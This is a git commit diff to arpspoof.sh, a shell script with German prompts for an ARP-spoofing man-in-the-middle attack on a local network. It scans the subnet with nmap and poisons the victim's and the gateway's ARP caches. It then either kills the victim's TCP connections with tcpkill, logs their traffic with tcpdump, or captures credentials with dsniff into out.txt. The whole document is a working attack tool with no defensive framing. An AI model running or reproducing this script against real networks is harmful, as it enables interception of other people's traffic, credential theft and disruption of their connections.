a84a9dc41671f01018889d8eba5c3d02aedb29e2
simono41 <simono41>
2018-07-19 16:14:33 +0200

    taskill

--- arpspoof.sh
+++ arpspoof.sh
@@ -10,15 +10,29 @@ fi
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-gateway=$(route -n|grep ^0.0.0.0|cut -d' ' -f 10)
+gateway=$(ip route show | grep dev -m1 | cut -d" " -f 3 )
 
-arp
-ip link
-read -p "Wie heisst die Schnittstelle? [enp30s0\eth0] : " modul
-nmap -sn ${gateway}/24
-read -p "Wie heisst die IP? : " ip
-
+if [ -z "$1" ]; then
+  ip link
+  read -p "Wie heisst die Schnittstelle? [enp4s0\eth0] : " modul
+else
+  modul="$1"
+fi
+if [ -z "$2" ]; then
+  nmap -sn ${gateway}/24
+  read -p "Wie heisst die IP? : " ip
+else
+  ip="$2"
+fi
 
 arpspoof -i $modul -t $ip -r $gateway &
 
-tcpdump -i $modul -A host $ip
+sleep 2
+
+if [ -z "$3" ]; then
+  tcpkill -9 host $ip
+elif [ "$3" == "tcpdump" ]; then
+  tcpdump -i $modul -A host $ip >> out.txt
+else
+  dsniff -i $modul -w out.txt
+fi
